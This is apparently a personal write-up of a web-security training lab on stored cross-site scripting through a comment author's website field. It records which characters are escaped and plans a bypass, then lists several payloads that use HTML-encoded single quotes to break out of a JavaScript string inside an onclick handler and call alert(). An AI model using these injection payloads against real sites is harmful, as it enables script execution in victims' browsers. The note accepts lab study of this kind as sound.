---
title: 20_Lab20-Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped
date: 2026-07-05
tags:
  - 
publish: true
draft: false
description: ""
---
---

This lab contains a stored cross-site scripting vulnerability in the comment functionality.

To solve this lab, submit a comment that calls the `alert` function when the comment author name is clicked.

---

```html
<a id="author" href="[http://sdfasadfi\'&lt;;sdf&gt;sdf](view-source:http://sdfasadfi/'%3C;sdf%3Esdf)" onclick="var tracker={track(){}};tracker.track('http://sdfasadfi\'&lt;;sdf&gt;sdf');">commet1&gt;sam&lt;sf3&apos;sdf&quot;sdf92</a> | 05 July 2026 </p>
```

```js
<p>commet1&gt;sam&lt;sf3&apos;sdf&quot;sdf92</p>
```



comment is reflected in the post's comment section: 

```html
<p> 
<img src="[/resources/images/avatarDefault.svg](view-source:https://0a240037043bc0908028fad200d1005a.web-security-academy.net/resources/images/avatarDefault.svg)" class="avatar"> 
<a id="author" href="[http://something.com](view-source:http://something.com/)" onclick="var tracker={track(){}};tracker.track('http://something.com');">name1</a> 
| 05 July 2026 </p> 
<p>comment1</p> 
```

test all characters : 

```
<, >, ', ", `, /, \
```

![[Pasted image 20260705215621.png]]

![[Pasted image 20260705215655.png]]

![[Pasted image 20260705215744.png]]


```html
<section class="comment"> 
	<p> 
		<img src="[/resources/images/avatarDefault.svg](view-source:https://0a240037043bc0908028fad200d1005a.web-security-academy.net/resources/images/avatarDefault.svg)" class="avatar"> 
		<a id="author" href="http://something.com&gt;abc&lt;abc\'abc&quot;abc`abc/abc\\abc" onclick="var tracker={track(){}};tracker.track('http://something.com&gt;abc&lt;abc\'abc&quot;abc`abc/abc\\abc');">
		name2&gt;abc&lt;abc&apos;abc&quot;abc\`abc/abc\\abc
		</a> 
		| 05 July 2026 
	</p> 
	<p>comment2&gt;abc&lt;abc&apos;abc&quot;abc\`abc/abc\\abc</p> 
	<p></p> 
</section>
```

Observation : 

Encoded or Escaped Characters

>< > (angle brackets) HTML encoded
>" (double quote) HTML encoded
>' (single quote)  escaped 
>\ (Backslash) escaped

Inserted characters as it is : 

>\` (backtick) 
>/ (Slash) 

### PAYLOAD Planning 

what if we insert an HTML encoded value, lets check whether browser render it to HTML element 

Since all the other fields are out of the tag, only content inside the `<a>` `href` tag is inside the tag, we will try to break out of the `href` attribute and try to call JavaScript by using `onclick` event. 

Since `href` is enclosed in the double quotes `"`, and `"` is HTML encoded. we cannot target `href` attribute, 

there is `onclick` event used in the `<a>` already, and the website URL is inserted into `tracker.tract()` function which is enclosed in (single quote) :   

and the single quote is escaped, we can use HTML encoded single quote value and let the browser decode the HTML encoded value while rendering in the DOM. 

#### Payload: 

```
http://something&apos;);alert(&apos;

or 

http://something&apos;);alert()&sol;&sol;

or 

http://something?&apos;-alert(1)-&apos; 

or 

http://something?&apos;+alert(1)+&apos; 

```

```html
<a id="author" href="http://something.com" onclick="var tracker={track(){}};tracker.track('http://something.com');alert('');">
```

```html
<a id="author" href="http://something.com');alert()//" onclick="var tracker={track(){}};tracker.track('http://something.com');alert()//';">
```

```html
<a id="author" href="http://something.com'-alert(1)-'" onclick="var tracker={track(){}};tracker.track('http://something.com'-alert()-'');">
```

```html
<a id="author" href="http://something.com'-alert(1)-'" onclick="var tracker={track(){}};tracker.track('http://something.com'+alert()+'');">
```



---





